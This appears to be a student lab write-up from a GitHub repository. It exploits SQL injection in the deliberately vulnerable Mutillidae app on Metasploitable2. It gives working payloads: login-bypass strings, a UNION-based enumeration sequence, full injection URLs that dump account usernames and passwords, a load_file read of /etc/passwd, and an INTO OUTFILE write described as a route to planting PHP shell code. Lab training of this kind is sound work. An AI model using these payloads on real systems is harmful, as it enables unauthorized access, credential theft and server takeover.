# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.


Identify IP address using ifconfig in Metasploitable2



Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.


Select Multidae from the menu listed as shown above. You will get the page as displayed below:


Click on the menu Login/Register and register for an account


Click on the link “Please register here”



Click on “Create Account” to display the following page:

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/95d9c9ab-9791-460b-8a57-66a41f011f32)


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.


 Click “Login”. The logged in page will show as below:
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/5299335f-c4ce-4038-b6f9-85cfbc597b88)


 ## Bypassing login field
 The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/f50e05b6-03c8-44d8-8974-58188f6fc453)


Click the login button and you will see it enter into the administrator page.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/0ebd4766-819a-4ca6-8eb2-f65b5d8b1507)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/0329a836-66c0-4514-bb40-bb6fb968c2c4)

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/f2b6b824-749f-4b16-8f78-09f8c1f35369)

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/4195e3db-dd8e-4257-9211-7d3aa1ff4a8a)

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/b6a31bb9-16e2-4fc8-9c56-e6c54159e508)

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/33d59eae-2200-49bc-ad05-cf9d55a0a0d0)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/6b033bd5-d575-4826-86f0-5ef166fe1a48)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/bd2a3e9e-a380-4ccd-a098-4d482d9848d8)


After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/b3f18ae6-ac80-4ac1-9dd7-6eea5afad5dc)


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/348b5e47-faff-47cc-821b-1aaa83e5a2f5)


 As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/7b35e6b4-d53c-4da7-af33-3284aaffc63a)


 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/4c3bbb6a-1eeb-4900-91e7-6fe309efc2b8)

 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/6bc758ba-29e9-401c-b9de-41e45b63434a)


 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/ba600c61-549f-4178-88c8-bda48cf4221d)


The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/4a15b4a4-4a9d-4734-9f4f-0de4b90080c5)


The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/100a54ff-855e-413d-b960-ea4fe462e51c)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/03bf0f12-bbd9-4736-8313-209121b6f4f0)


Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/f047dea8-00cf-465e-8f60-07b54d73ca49)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sreekarsh/sqlinjection/assets/139841918/1e47a065-d222-4849-84eb-c2a50855f17e)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
